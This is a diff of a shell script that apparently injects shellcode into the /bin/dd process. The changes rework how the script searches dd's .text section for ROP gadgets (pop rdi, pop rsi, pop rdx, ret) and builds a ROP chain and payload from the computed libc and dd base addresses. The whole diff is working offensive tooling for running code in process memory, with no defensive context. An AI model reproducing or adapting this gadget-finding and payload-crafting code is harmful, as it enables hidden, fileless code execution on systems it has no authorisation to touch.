@@ -4,7 +4,7 @@ filename=/bin/dd
 
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
 # Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
-DEBUG=0
+if [ -z "$DEBUG" ]; then DEBUG=0; fi
 
 # Endian conversion
 endian()
@@ -474,21 +474,26 @@ craft_payload2()
     echo -n $sc_len $sc$writebin$stack $interp
 }
 
-read_text()
+find_gadget()
 {
+    local off=""
     local text_off=$(search_section file $1 .text)
     local text_size=$(echo $text_off | cut -d' ' -f2)
     text_off=$(echo $text_off | cut -d' ' -f1)
-    local text=$(tail $1 -c +$text_off | head -c $text_size |\
-    od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
-    echo -n $text $text_off
-}
-find_gadget()
-{
-    local after=${1#*$4}
-    local off=$((${#1} - ${#after} - ${#4}))
-    off=$((off / 2))
-    off=$((off + $2 + 0x$3 - 1))
+
+    if [ -n "$(grep --help 2>&1 | grep "byte-offset")" ]
+    then
+        off=$(tail $1 -c +$text_off | head -c $text_size | od -v -t x1 |\
+              head -n-1 | cut -d' ' -f2- | tr -d ' \n' | grep -a -b -F -o $3 |\
+              head -n1 | cut -d':' -f1)
+        off=$((off / 2 - 1))
+    else # busybox's grep does not include this option
+        local text=$(tail $1 -c +$text_off | head -c $text_size |\
+                     od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
+        local after=${text#*$3}
+        off=$(((${#text} - ${#after} - ${#3} - 1) / 2))
+    fi
+    off=$((off + $text_off + 0x$2))
 
     printf $(endian $(printf %016x $off))
 }
@@ -499,13 +504,10 @@ craft_rop()
                       cut -d'-' -f1)
     libc_base=$((0x$libc_base))
 
-    local text=$(read_text $filename)
-    local text_off=$(echo -n $text | cut -d' ' -f2)
-    text=$(echo -n $text | cut -d' ' -f1)
-    local pop_rdi=$(find_gadget $text $text_off $dd_base "5fc3")
-    local pop_rsi=$(find_gadget $text $text_off $dd_base "5ec3")
-    local pop_rdx=$(find_gadget $text $text_off $dd_base "5ac3")
-    local ret=$(find_gadget $text $text_off $dd_base "c3")
+    local pop_rdi=$(find_gadget $filename $dd_base "5fc3")
+    local pop_rsi=$(find_gadget $filename $dd_base "5ec3")
+    local pop_rdx=$(find_gadget $filename $dd_base "5ac3")
+    local ret=$(find_gadget $filename $dd_base "c3")
     local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
     map_size=$(endian $(printf %016x $map_size))
 
